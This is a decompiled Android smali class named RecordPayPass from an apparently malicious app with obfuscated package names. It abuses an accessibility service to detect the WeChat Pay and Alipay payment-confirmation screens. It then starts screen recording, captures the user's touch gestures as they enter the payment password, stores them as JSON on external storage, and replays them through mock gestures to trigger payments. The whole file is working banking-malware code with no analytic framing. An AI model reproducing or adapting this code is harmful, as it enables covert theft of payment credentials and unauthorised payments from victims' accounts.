.class public L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;
.super Ljava/lang/Object;
.source "RecordPayPass.java"


# static fields
.field static accessService:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

.field public static allSteps:Ljava/util/LinkedList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedList<",
            "Ljava/util/LinkedList<",
            "Landroid/view/MotionEvent;",
            ">;>;"
        }
    .end annotation
.end field

.field private static delayedAction:Ljava/lang/Runnable;

.field private static delayedAction2:Ljava/lang/Runnable;

.field static handler:Landroid/os/Handler;

.field static ifError:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .line 36
    new-instance v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$1;

    invoke-direct {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$1;-><init>()V

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->delayedAction:Ljava/lang/Runnable;

    .line 61
    new-instance v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$2;

    invoke-direct {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$2;-><init>()V

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->delayedAction2:Ljava/lang/Runnable;

    .line 208
    new-instance v0, Landroid/os/Handler;

    new-instance v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$5;

    invoke-direct {v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$5;-><init>()V

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Handler$Callback;)V

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->handler:Landroid/os/Handler;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000(Ljava/lang/String;)V
    .locals 0

    .line 23
    invoke-static {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->saveFile(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$100(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;Ljava/lang/String;)Ljava/util/LinkedList;
    .locals 0

    .line 23
    invoke-static {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->getFromFile(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;Ljava/lang/String;)Ljava/util/LinkedList;

    move-result-object p0

    return-object p0
.end method

.method public static checkPayEvent(Landroid/view/accessibility/AccessibilityEvent;L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;)V
    .locals 1

    .line 31
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->ifAutoaaa:Z

    if-eqz v0, :cond_0

    return-void

    .line 34
    :cond_0
    invoke-static {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->recordOppoScreenHuaLockPasswrod(Landroid/view/accessibility/AccessibilityEvent;L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;)V

    return-void
.end method

.method public static execGestureInPay()V
    .locals 3

    .line 189
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->allSteps:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 190
    sput-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->ifAutoaaa:Z

    return-void

    .line 193
    :cond_0
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->accessService:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->allSteps:Ljava/util/LinkedList;

    new-instance v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$4;

    invoke-direct {v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$4;-><init>()V

    invoke-static {v0, v1, v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/PerformGestureUtil;->startMockGesture(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;Ljava/util/LinkedList;L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/PerformGestureListener;)V

    return-void
.end method

.method private static getFromFile(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;Ljava/lang/String;)Ljava/util/LinkedList;
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/LinkedList<",
            "Ljava/util/LinkedList<",
            "Landroid/view/MotionEvent;",
            ">;>;"
        }
    .end annotation

    .line 162
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/Config/sys/apps/pay/pay_"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".text"

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 163
    new-instance p1, Ljava/io/File;

    invoke-direct {p1, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 164
    invoke-static {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/FileUtils;->readText(Ljava/io/File;)Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_3

    const-string p1, ""

    .line 165
    invoke-virtual {p1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_2

    :cond_0
    const-string p1, "834hufy4hdj"

    .line 168
    invoke-virtual {p0, p1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    .line 169
    new-instance p1, Ljava/util/LinkedList;

    invoke-direct {p1}, Ljava/util/LinkedList;-><init>()V

    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 170
    :goto_0
    array-length v2, p0

    if-ge v1, v2, :cond_2

    .line 171
    aget-object v2, p0, v1

    const-string v3, "745jf7rkg"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 172
    new-instance v3, Ljava/util/LinkedList;

    invoke-direct {v3}, Ljava/util/LinkedList;-><init>()V

    const/4 v4, 0x0

    .line 173
    :goto_1
    array-length v5, v2

    if-ge v4, v5, :cond_1

    .line 175
    :try_start_0
    new-instance v5, Lorg/json/JSONObject;

    aget-object v6, v2, v4

    invoke-direct {v5, v6}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/Json;->jsonToMotionEvent(Lorg/json/JSONObject;)Landroid/view/MotionEvent;

    move-result-object v5

    .line 176
    invoke-virtual {v3, v5}, Ljava/util/LinkedList;->offer(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    :catch_0
    move-exception p0

    .line 178
    new-instance p1, Ljava/lang/RuntimeException;

    invoke-direct {p1, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw p1

    .line 181
    :cond_1
    invoke-virtual {p1, v3}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_2
    return-object p1

    .line 166
    :cond_3
    :goto_2
    new-instance p0, Ljava/util/LinkedList;

    invoke-direct {p0}, Ljava/util/LinkedList;-><init>()V

    return-object p0
.end method

.method public static gettext(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;Ljava/lang/String;)V
    .locals 1

    .line 219
    sput-object p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->accessService:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    .line 220
    new-instance p0, Ljava/lang/Thread;

    new-instance v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$6;

    invoke-direct {v0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$6;-><init>(Ljava/lang/String;)V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 232
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static recordOppoScreenHuaLockPasswrod(Landroid/view/accessibility/AccessibilityEvent;L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;)V
    .locals 6

    .line 88
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    const-wide/16 v2, 0x3a98

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-ne v0, v1, :cond_0

    const-string v0, "com.tencent.mm"

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    .line 89
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5fae\u4fe1\u652f\u4ed8"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "1"

    .line 91
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->payType:Ljava/lang/String;

    .line 92
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->savePayType()V

    .line 93
    sput-boolean v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->ifInRecoedPayPass:Z

    .line 94
    invoke-static {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordScreenUtil;->startRecord(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;)V

    .line 95
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->handler:Landroid/os/Handler;

    sget-object v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->delayedAction:Ljava/lang/Runnable;

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 97
    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v5, :cond_1

    const-string v0, "com.eg.android.AlipayGphone"

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 98
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    const-string v0, "\u786e\u8ba4\u4ed8\u6b3e"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_1

    const-string p0, "2"

    .line 100
    sput-object p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->payType:Ljava/lang/String;

    .line 101
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->savePayType()V

    .line 102
    sput-boolean v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->ifInRecoedPayPass:Z

    .line 103
    invoke-static {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordScreenUtil;->startRecord(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;)V

    .line 104
    sget-object p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->handler:Landroid/os/Handler;

    sget-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->delayedAction2:Ljava/lang/Runnable;

    invoke-virtual {p0, p1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_1
    return-void
.end method

.method private static saveFile(Ljava/lang/String;)V
    .locals 6

    .line 135
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 136
    :goto_0
    sget-object v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->allSteps:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_3

    .line 137
    sget-object v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->allSteps:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/util/LinkedList;

    const/4 v4, 0x0

    .line 138
    :goto_1
    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v5

    if-ge v4, v5, :cond_1

    .line 139
    invoke-virtual {v3, v4}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/MotionEvent;

    .line 140
    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/Json;->motionEventToJSON(Landroid/view/MotionEvent;)Lorg/json/JSONObject;

    move-result-object v5

    .line 141
    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 142
    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v5

    add-int/lit8 v5, v5, -0x1

    if-eq v4, v5, :cond_0

    const-string v5, "745jf7rkg"

    .line 143
    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    .line 146
    :cond_1
    sget-object v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass;->allSteps:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    if-eq v2, v3, :cond_2

    const-string v3, "834hufy4hdj"

    .line 147
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 150
    :cond_3
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/Config/sys/apps/pay/pay_"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, ".text"

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 151
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 152
    new-instance p0, Ljava/lang/Thread;

    new-instance v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$3;

    invoke-direct {v2, v1, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RecordPayPass$3;-><init>(Ljava/io/File;Ljava/lang/StringBuilder;)V

    invoke-direct {p0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 158
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    return-void
.end method
